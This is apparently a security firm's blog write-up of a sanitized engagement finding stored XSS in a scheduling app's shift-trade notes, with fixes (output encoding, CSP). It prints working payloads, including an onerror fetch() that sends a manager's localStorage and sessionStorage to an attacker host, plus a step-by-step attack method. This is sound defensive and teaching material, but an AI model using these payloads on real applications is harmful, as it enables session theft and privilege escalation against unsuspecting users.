---
title: "A Note From an Employee, a Cookie From the Boss"
date: August 2026
source: https://blog.imperonlabs.com/blog/a-note-from-an-employee-a-cookie-from-the-boss.html
---

Web · Stored XSS

# A Note From an Employee, a Cookie From the Boss

By Imperonlabs Research · August 2026 · 10 min read

The app was built so a shift worker could never reach a manager's data. No shared endpoints, no role confusion, access control that actually worked. Then an employee typed a broken image tag into a trade request note, a manager hovered over the notes icon to review it, and the manager's session storage left the building. The employee never called a privileged endpoint. They let the manager's own browser do it.

**Scope note.** Sanitized from a real engagement on a workforce scheduling platform (mobile app for staff, web console for managers). Endpoints and payloads are examples.

Scheduling apps run on free text. Shift trade requests carry notes: a message to the coworker you are trading with, and a note for the manager who approves it. Free text fields are where I always start on this kind of app, because they are written by low privilege users and read by high privilege ones, and that direction of flow is the whole game.

## Does the field accept markup at all

Authenticated as an ordinary employee, I created a trade request and dropped a plain image probe into both the recipient note and the admin note to see whether the field stores markup or escapes it:

```
<img src="OnXSS" onerror="(location.href='https://malicious.example')">
```

The create request went out roughly like this:

```
GET /app/schedule/trade?action=create&date=2025-10-03&sched=2&slot=4
  &recipient_note=%3Cimg%20Src%3DOnXSS%20OnError%3D(location.href%3D%27https%3A%2F%2Fmalicious.example%27)%3E
  &admin_note=%3Cimg%20Src%3DOnXSS%20OnError%3D...%3E&trade_user=6 HTTP/1.1
Host: app.example.com
Cookie: <employee session>
X-Requested-With: XMLHttpRequest
```

The server answered `{ "success": true }` and stored the markup verbatim. No sanitization, no encoding, no filtering. A broken `src` guarantees the `onerror` handler runs the instant a browser tries to render the tag, which makes it a reliable trigger with no user interaction beyond looking at the note.

## Firing it in a session that matters

The payload sitting in the employee's own view is nothing. The value is who reads it next. I switched to a manager account and opened the trade request review interface, the screen a manager uses to approve or reject trades. Hovering over the notes icon was enough. The browser parsed the `<img>`, failed to load the fake `src`, and ran the `onerror` code inside the manager's authenticated session. No click on a link, no crafted URL. The manager just did their job.

Access control blocks the endpoint. It does not block the render.

Employee
stores payload in
the trade note
<img onerror=...>

Manager
opens review view,
payload executes in
their session

Attacker
receives storage,
tokens, and API
access as manager

The employee never touches a manager endpoint. The manager's browser runs the employee's code with the manager's cookies.

Stored XSS is a channel that carries code up the privilege gradient. Access control guards endpoints, not what a trusted user's browser renders.

## From popup to session theft

A redirect proves execution but proves nothing about impact, so I swapped it for a payload that harvests client side state:

```
<img src="x" onerror="fetch('https://collect.attacker.example/?ls='
  +encodeURIComponent(JSON.stringify(localStorage))
  +'&ss='+encodeURIComponent(JSON.stringify(sessionStorage)))">
```

When a manager opened the request, this shipped the full contents of both `localStorage` and `sessionStorage` to a server I controlled: client side tokens, identifiers, and cached data, all captured automatically. And because the code runs in the manager's origin, any authenticated `fetch()` I make carries the manager's session implicitly, which means I can drive the application's own API with manager privileges without ever holding their password. Every open trade request is another instance of the payload, and multiple concurrent notes can saturate manager sessions across the organization. The same field renders identically on the mobile app and the web console, so the exposure is not limited to one client.

## Why the access control model did not help

The app was correct about the thing it set out to do. A low role genuinely cannot call a high role's endpoints. But this attack does not call a privileged endpoint. It plants code in a place a privileged user will render, and lets that user's browser act with that user's authority. That is a privilege escalation channel that lives entirely outside the access control model, which is precisely why it is easy to ship an app that is careful about roles and still wide open to this.

## How to fix it properly

The primary control is output encoding. Render every user supplied note as text, never as markup, using the framework's safe rendering path so that `<`, `>`, and `&` come out as their escaped equivalents and the browser never parses injected tags. That single change kills this bug. Layer a restrictive CSP behind it so an injected handler cannot execute even if an encoding gap appears later:

```
script-src 'self'; object-src 'none'; base-uri 'self';
```

Treat input validation, length caps and character allowlists, as hygiene only, never as the defense, because encoding bypasses keep appearing. Then audit every other user writable field the same way, comments, profile data, and descriptions included, so a variant of this does not survive in a different corner of the UI.

## How to approach stored XSS on any target

1. Map which fields a low privilege user writes and a high privilege user reads. That direction is where the value is.
2. Probe with a broken image tag. An `onerror` that fires on render needs no interaction beyond viewing.
3. Confirm the storage is raw. A response of success plus unmodified markup is the whole vulnerability.
4. Trigger it from the privileged session and go straight to session state and API access, not a popup.
5. Check every surface that renders the field. The same stored value may fire on both web and mobile.

The one line to remember
Stored XSS is not about the popup. It is about finding the field a low role writes and a high role renders, because that field is a privilege escalation channel your access control never sees.

### Which of your text fields does a junior user write and a senior user open?

Imperonlabs traces user content from the field it enters to the session that renders it, then shows you the escalation your role model cannot stop. Book a scoping call and we will find your quiet channels.

[Request an assessment](https://imperonlabs.com/#contact)
